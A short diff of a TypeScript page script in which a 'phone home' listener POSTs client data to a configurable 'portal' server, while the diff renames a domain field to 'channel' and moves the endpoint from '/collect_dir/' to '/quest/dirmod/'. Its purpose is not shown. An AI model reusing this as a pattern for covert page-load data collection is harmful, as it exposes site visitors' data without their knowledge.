@@ -4,7 +4,7 @@ document.addEventListener('DOMContentLoaded', () => { /* phone home */
 interface S {
     sign: string;
     portal: string;
-    domain: string;                       
+    channel: string;                       
     domset: number;                     //dom element counter
     proc: any[];                        //navi session call log
     cache: any[];                       //active state index
@@ -147,7 +147,7 @@ function chisa(request?: { [key: string]: any }): void {
             return;
         } else {
             alice.portal = meta['portal'];
-            alice.domain = meta['domain'];
+            alice.channel = meta['channel'];
         }
         const bodyData = {
             client: {
@@ -161,7 +161,7 @@ function chisa(request?: { [key: string]: any }): void {
             headers: {'Content-Type': 'application/json',},
             body: JSON.stringify(bodyData)
         };
-        fetch(alice.portal + '/collect_dir/', requestOptions)
+        fetch(alice.portal + '/quest/dirmod/', requestOptions)
             .then(response => {
                 if (!response.ok) {
                     throw new Error('no response');
@@ -194,7 +194,7 @@ function chisa(request?: { [key: string]: any }): void {
 const alice: S = {
     sign: 'xo',
     portal: '',
-    domain: '',
+    channel: '',
     domset: 0,
     proc: [],
     cache: [],
